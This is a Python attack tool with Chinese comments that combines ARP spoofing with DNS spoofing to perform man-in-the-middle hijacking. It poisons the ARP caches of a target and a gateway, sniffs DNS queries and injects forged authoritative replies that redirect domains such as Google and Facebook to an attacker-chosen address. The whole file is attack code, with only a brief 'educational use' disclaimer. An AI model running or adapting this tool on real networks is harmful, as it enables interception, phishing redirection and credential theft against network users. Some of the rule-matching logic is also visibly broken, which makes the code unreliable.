#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级DNS劫持工具 - 多功能集成版
结合ARP欺骗实现完整的中间人攻击

功能特性：
1. 智能DNS欺骗和重定向
2. 多种劫持模式（精确匹配、通配符、正则表达式）
3. 实时流量分析和统计
4. 与ARP欺骗无缝集成
5. 详细的日志记录和报告
6. 防御检测和规避

⚠️ 重要提醒：仅供学习和授权的安全测试使用
"""

import os
import sys
import time
import socket
import threading
import re
import json
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from collections import defaultdict, deque
from enum import Enum

# 导入scapy相关模块
try:
    from scapy.all import *
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.sendrecv import sniff, send, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    print("[-] 警告: scapy库未安装，部分功能将受限")
    SCAPY_AVAILABLE = False

class HijackMode(Enum):
    """劫持模式枚举"""
    EXACT = "exact"          # 精确匹配
    WILDCARD = "wildcard"    # 通配符匹配
    REGEX = "regex"          # 正则表达式匹配

class DNSRecordType(Enum):
    """DNS记录类型枚举"""
    A = "A"          # IPv4地址
    AAAA = "AAAA"    # IPv6地址
    CNAME = "CNAME"  # 别名
    MX = "MX"        # 邮件交换
    NS = "NS"        # 域名服务器

class AdvancedDNSHijack:
    def __init__(self, config_file: str = "dns_hijack_config.json"):
        """初始化高级DNS劫持工具"""
        
        self.is_running = False
        self.is_arp_spoofing = False
        self.interface = None
        
        # 先设置基础日志（用于配置加载过程）
        self.setup_basic_logging()
        
        # 配置管理
        self.config = self.load_configuration(config_file)
        
        # 完整日志系统
        self.logger = self.setup_logging()
        
        # 劫持规则
        self.hijack_rules = {
            'exact': {},      # 精确匹配
            'wildcard': {},   # 通配符匹配
            'regex': {}       # 正则表达式匹配
        }
        
        # 统计信息
        self.stats = {
            'start_time': None,
            'total_queries': 0,
            'hijacked_queries': 0,
            'forwarded_queries': 0,
            'errors': 0,
            'domains_hijacked': defaultdict(int),
            'query_types': defaultdict(int)
        }
        
        # 缓存系统
        self.dns_cache = {}
        self.cache_ttl = self.config.get('cache_ttl', 300)
        
        # 线程管理
        self.threads = []
        self.lock = threading.Lock()
        
        # 实时监控
        self.monitor_data = deque(maxlen=1000)
        
        # 加载默认规则
        self.load_default_rules()
        
        self.logger.info("高级DNS劫持工具初始化完成")
    
    def load_configuration(self, config_file: str) -> Dict[str, Any]:
        """加载配置文件"""
        default_config = {
            'dns_servers': ['8.8.8.8', '8.8.4.4'],
            'listen_port': 53,
            'cache_ttl': 300,
            'sniff_timeout': 30,
            'max_packets': 1000,
            'log_level': 'INFO',
            'hijack_modes': ['exact', 'wildcard'],
            'defense_evasion': True,
            'performance_optimization': True
        }
        
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    user_config = json.load(f)
                
                # 合并配置
                default_config.update(user_config)
                self.logger.info(f"配置文件加载成功: {config_file}")
                
            except Exception as e:
                self.logger.error(f"配置文件加载失败: {e}")
        else:
            self.logger.warning(f"配置文件不存在，使用默认配置: {config_file}")
        
        return default_config
    
    def setup_basic_logging(self):
        """设置基础日志系统（用于初始化过程）"""
        # 创建一个基础的logger，不依赖配置
        self.logger = logging.getLogger('AdvancedDNSHijack_Basic')
        self.logger.setLevel(logging.INFO)
        
        # 清除已有的处理器
        for handler in self.logger.handlers[:]:
            self.logger.removeHandler(handler)
        
        # 基础控制台处理器
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        formatter = logging.Formatter('%(levelname)s - %(message)s')
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
    
    def setup_logging(self) -> logging.Logger:
        """设置完整日志系统"""
        # 重新设置logger
        logger = logging.getLogger('AdvancedDNSHijack')
        logger.setLevel(logging.DEBUG)
        
        # 清除已有的处理器
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        
        # 日志格式
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        # 控制台处理器
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(getattr(logging, self.config.get('log_level', 'INFO')))
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        # 文件处理器
        log_dir = 'logs'
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, f'dns_hijack_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        return logger
    
    def load_default_rules(self):
        """加载默认劫持规则"""
        default_rules = {
            'exact': {
                'www.google.com': '127.0.0.1',
                'www.facebook.com': '127.0.0.1',
                'www.youtube.com': '127.0.0.1',
                'www.twitter.com': '127.0.0.1'
            },
            'wildcard': {
                'google.com': '127.0.0.1',
                'facebook.com': '127.0.0.1'
            },
            'regex': {
                r'\b(ad|ads|adserver|tracking)\.': '127.0.0.1'
            }
        }
        
        for mode, rules in default_rules.items():
            self.hijack_rules[mode].update(rules)
        
        self.logger.info(f"加载默认劫持规则: {sum(len(rules) for rules in self.hijack_rules.values())} 条")
    
    def add_hijack_rule(self, domain: str, redirect_ip: str, 
                       mode: HijackMode = HijackMode.EXACT, 
                       record_type: DNSRecordType = DNSRecordType.A):
        """添加劫持规则"""
        rule_key = f"{domain}|{record_type.value}"
        
        self.hijack_rules[mode.value][rule_key] = {
            'redirect_ip': redirect_ip,
            'record_type': record_type.value,
            'added_time': datetime.now().isoformat()
        }
        
        self.logger.info(f"添加劫持规则: {domain} -> {redirect_ip} ({mode.value}/{record_type.value})")
    
    def remove_hijack_rule(self, domain: str, mode: HijackMode = None):
        """移除劫持规则"""
        removed_count = 0
        
        modes_to_check = [mode.value] if mode else self.hijack_rules.keys()
        
        for check_mode in modes_to_check:
            keys_to_remove = [k for k in self.hijack_rules[check_mode].keys() 
                            if k.startswith(domain + '|')]
            
            for key in keys_to_remove:
                del self.hijack_rules[check_mode][key]
                removed_count += 1
        
        if removed_count > 0:
            self.logger.info(f"移除 {removed_count} 条劫持规则: {domain}")
        else:
            self.logger.warning(f"未找到匹配的劫持规则: {domain}")
    
    def should_hijack_domain(self, domain: str, query_type: str) -> Optional[Dict]:
        """判断是否需要劫持该域名"""
        
        # 1. 精确匹配
        exact_key = f"{domain}|{query_type}"
        if exact_key in self.hijack_rules['exact']:
            return self.hijack_rules['exact'][exact_key]
        
        # 2. 通配符匹配
        for rule_key, rule_data in self.hijack_rules['wildcard'].items():
            rule_domain, rule_type = rule_key.split('|')
            
            if rule_type == query_type or rule_type == '*':
                if domain.endswith(rule_domain) or domain == rule_domain:
                    return rule_data
        
        # 3. 正则表达式匹配
        for pattern, rule_data in self.hijack_rules['regex'].items():
            rule_type = rule_data.get('record_type', '*')
            
            if rule_type == query_type or rule_type == '*':
                if re.search(pattern, domain, re.IGNORECASE):
                    return rule_data
        
        return None
    
    def start_dns_hijack(self, target_ip: str = None, 
                        gateway_ip: str = None,
                        interface: str = None) -> bool:
        """开始DNS劫持攻击"""
        
        self.logger.info("开始DNS劫持攻击")
        
        if target_ip:
            self.logger.info(f"目标IP: {target_ip}")
        if gateway_ip:
            self.logger.info(f"网关IP: {gateway_ip}")
        
        self.is_running = True
        self.stats['start_time'] = datetime.now()
        
        try:
            # 启动ARP欺骗（如果提供了目标IP和网关IP）
            if target_ip and gateway_ip:
                self.start_arp_spoofing(target_ip, gateway_ip, interface)
            
            # 启动DNS嗅探
            sniff_filter = "udp port 53"
            if target_ip:
                sniff_filter += f" and host {target_ip}"
            
            self.logger.info(f"DNS嗅探过滤器: {sniff_filter}")
            
            # 启动嗅探线程
            sniff_thread = threading.Thread(
                target=self.dns_sniff_worker,
                args=(sniff_filter, interface)
            )
            sniff_thread.daemon = True
            sniff_thread.start()
            self.threads.append(sniff_thread)
            
            # 启动监控线程
            monitor_thread = threading.Thread(target=self.monitor_worker)
            monitor_thread.daemon = True
            monitor_thread.start()
            self.threads.append(monitor_thread)
            
            # 主循环
            self.main_loop()
            
            return True
            
        except KeyboardInterrupt:
            self.logger.info("用户中断攻击")
            return False
        except Exception as e:
            self.logger.error(f"DNS劫持失败: {e}")
            return False
        finally:
            self.stop_attack()
    
    def dns_sniff_worker(self, filter_str: str, interface: str = None):
        """DNS嗅探工作线程"""
        try:
            sniff(
                filter=filter_str,
                prn=self.process_dns_packet,
                iface=interface,
                store=0,
                stop_filter=lambda x: not self.is_running
            )
        except Exception as e:
            self.logger.error(f"DNS嗅探错误: {e}")
    
    def process_dns_packet(self, packet):
        """处理DNS数据包"""
        if not self.is_running or not packet.haslayer(DNS):
            return
        
        try:
            dns_layer = packet[DNS]
            
            # 只处理查询包
            if dns_layer.qr == 0 and dns_layer.qd:
                self.handle_dns_query(packet, dns_layer)
            
            # 处理响应包（用于统计）
            elif dns_layer.qr == 1:
                self.handle_dns_response(packet, dns_layer)
        
        except Exception as e:
            self.logger.error(f"处理DNS包错误: {e}")
            self.stats['errors'] += 1
    
    def handle_dns_query(self, packet, dns_layer):
        """处理DNS查询包"""
        query = dns_layer.qd
        domain = query.qname.decode('utf-8').rstrip('.')
        query_type = self.get_query_type_name(query.qtype)
        
        # 更新统计
        self.stats['total_queries'] += 1
        self.stats['query_types'][query_type] += 1
        
        # 记录监控数据
        self.monitor_data.append({
            'timestamp': datetime.now().isoformat(),
            'type': 'query',
            'domain': domain,
            'query_type': query_type,
            'source_ip': packet[IP].src
        })
        
        # 检查是否需要劫持
        hijack_rule = self.should_hijack_domain(domain, query_type)
        
        if hijack_rule:
            self.hijack_dns_query(packet, domain, query_type, hijack_rule)
            self.stats['hijacked_queries'] += 1
            self.stats['domains_hijacked'][domain] += 1
            
            self.logger.info(f"劫持DNS查询: {domain} ({query_type}) -> {hijack_rule['redirect_ip']}")
        else:
            self.stats['forwarded_queries'] += 1
            # 可以在这里实现转发到真实DNS服务器
    
    def hijack_dns_query(self, packet, domain: str, query_type: str, hijack_rule: Dict):
        """劫持DNS查询"""
        try:
            ip_layer = packet[IP]
            udp_layer = packet[UDP]
            
            # 构建伪造的DNS响应
            fake_response = self.build_fake_dns_response(
                ip_layer, udp_layer, packet[DNS],
                domain, query_type, hijack_rule
            )
            
            # 发送伪造响应
            send(fake_response, verbose=False)
            
        except Exception as e:
            self.logger.error(f"劫持DNS查询失败: {e}")
    
    def build_fake_dns_response(self, ip_layer, udp_layer, dns_layer, 
                               domain: str, query_type: str, hijack_rule: Dict) -> Packet:
        """构建伪造的DNS响应包"""
        
        # 基础响应结构
        response = IP(src=ip_layer.dst, dst=ip_layer.src) / \
                  UDP(sport=udp_layer.dport, dport=udp_layer.sport) / \
                  DNS(
                      id=dns_layer.id,
                      qr=1,      # 响应标志
                      aa=1,      # 权威回答
                      qd=dns_layer.qd  # 查询部分
                  )
        
        # 根据查询类型添加响应记录
        if query_type == 'A' and hijack_rule['record_type'] == 'A':
            response[DNS].an = DNSRR(
                rrname=domain + ".",
                type="A",
                rclass="IN",
                ttl=300,  # 5分钟TTL
                rdata=hijack_rule['redirect_ip']
            )
        
        # 可以扩展支持其他记录类型
        
        return response
    
    def handle_dns_response(self, packet, dns_layer):
        """处理DNS响应包（用于统计）"""
        if dns_layer.an:
            answer = dns_layer.an[0]
            domain = answer.rrname.decode('utf-8').rstrip('.')
            
            self.monitor_data.append({
                'timestamp': datetime.now().isoformat(),
                'type': 'response',
                'domain': domain,
                'answer_type': self.get_query_type_name(answer.type),
                'answer_data': str(answer.rdata) if hasattr(answer, 'rdata') else 'N/A'
            })
    
    def start_arp_spoofing(self, target_ip: str, gateway_ip: str, interface: str = None):
        """启动ARP欺骗"""
        if not SCAPY_AVAILABLE:
            self.logger.warning("scapy不可用，跳过ARP欺骗")
            return
        
        self.is_arp_spoofing = True
        
        # 简化的ARP欺骗实现
        arp_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(target_ip, gateway_ip, interface)
        )
        arp_thread.daemon = True
        arp_thread.start()
        self.threads.append(arp_thread)
        
        self.logger.info(f"ARP欺骗启动: {target_ip} <-> {gateway_ip}")
    
    def arp_spoof_worker(self, target_ip: str, gateway_ip: str, interface: str = None):
        """ARP欺骗工作线程"""
        try:
            # 获取MAC地址
            target_mac = self.get_mac_address(target_ip)
            gateway_mac = self.get_mac_address(gateway_ip)
            
            if not target_mac or not gateway_mac:
                self.logger.error("无法获取MAC地址，ARP欺骗失败")
                return
            
            while self.is_running and self.is_arp_spoofing:
                # 发送ARP欺骗包
                try:
                    # 欺骗目标：网关的MAC是我们
                    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                    # 欺骗网关：目标的MAC是我们
                    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                    
                    send(pkt1, verbose=False)
                    send(pkt2, verbose=False)
                    
                except Exception as e:
                    self.logger.error(f"发送ARP包失败: {e}")
                
                time.sleep(2)  # 每2秒发送一次
        
        except Exception as e:
            self.logger.error(f"ARP欺骗错误: {e}")
    
    def monitor_worker(self):
        """监控工作线程"""
        while self.is_running:
            time.sleep(10)  # 每10秒报告一次
            
            # 计算统计信息
            total_time = (datetime.now() - self.stats['start_time']).total_seconds()
            queries_per_sec = self.stats['total_queries'] / max(total_time, 1)
            hijack_rate = (self.stats['hijacked_queries'] / max(self.stats['total_queries'], 1)) * 100
            
            self.logger.info(
                f"监控: {self.stats['total_queries']}查询 "
                f"({queries_per_sec:.1f}/s), "
                f"劫持 {self.stats['hijacked_queries']} "
                f"({hijack_rate:.1f}%)"
            )
    
    def main_loop(self):
        """主循环"""
        try:
            while self.is_running:
                time.sleep(1)
                
                # 检查线程状态
                for thread in self.threads[:]:
                    if not thread.is_alive():
                        self.threads.remove(thread)
        
        except KeyboardInterrupt:
            self.logger.info("接收到中断信号")
    
    def stop_attack(self):
        """停止攻击"""
        self.logger.info("停止DNS劫持攻击")
        
        self.is_running = False
        self.is_arp_spoofing = False
        
        # 等待线程结束
        for thread in self.threads:
            thread.join(timeout=5)
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成攻击报告"""
        report = {
            'attack_summary': {
                'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
                'end_time': datetime.now().isoformat(),
                'total_duration': self.calculate_duration(),
                'total_queries': self.stats['total_queries'],
                'hijacked_queries': self.stats['hijacked_queries'],
                'forwarded_queries': self.stats['forwarded_queries'],
                'error_count': self.stats['errors']
            },
            'query_statistics': dict(self.stats['query_types']),
            'hijacked_domains': dict(self.stats['domains_hijacked']),
            'hijack_rules': self.get_rules_summary()
        }
        
        # 保存报告
        report_file = f"reports/dns_hijack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        os.makedirs('reports', exist_ok=True)
        
        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.logger.info(f"攻击报告已保存: {report_file}")
        except Exception as e:
            self.logger.error(f"保存报告失败: {e}")
        
        return report
    
    def calculate_duration(self) -> str:
        """计算攻击持续时间"""
        if not self.stats['start_time']:
            return "0"
        
        duration = datetime.now() - self.stats['start_time']
        return str(duration)
    
    def get_rules_summary(self) -> Dict:
        """获取规则摘要"""
        summary = {}
        for mode, rules in self.hijack_rules.items():
            summary[mode] = len(rules)
        return summary
    
    # 工具方法
    def get_query_type_name(self, qtype: int) -> str:
        """获取查询类型名称"""
        type_map = {
            1: 'A',      # IPv4地址
            28: 'AAAA',  # IPv6地址
            5: 'CNAME',  # 别名
            15: 'MX',    # 邮件交换
            2: 'NS'      # 域名服务器
        }
        return type_map.get(qtype, str(qtype))
    
    def get_mac_address(self, ip: str) -> Optional[str]:
        """获取MAC地址"""
        try:
            ans, unans = arping(ip, verbose=False, timeout=2)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None

def main():
    """主函数"""
    print("=" * 60)
    print("           高级DNS劫持工具")
    print("              (教育用途)")
    print("=" * 60)
    
    if not SCAPY_AVAILABLE:
        print("[-] 错误: scapy库未安装")
        print("[!] 请安装: pip install scapy")
        return
    
    # 创建实例
    dns_hijack = AdvancedDNSHijack()
    
    # 演示模式
    print("\n[+] 演示模式启动...")
    
    # 显示当前规则
    print("\n当前劫持规则:")
    for mode, rules in dns_hijack.hijack_rules.items():
        print(f"  {mode}: {len(rules)} 条规则")
    
    # 演示添加规则
    print("\n[+] 演示添加劫持规则...")
    dns_hijack.add_hijack_rule(
        "example.com", 
        "127.0.0.1", 
        HijackMode.EXACT, 
        DNSRecordType.A
    )
    
    print("\n[+] DNS劫持工具准备就绪")
    print("[!] 使用 start_dns_hijack() 方法开始攻击")

if __name__ == "__main__":
    main()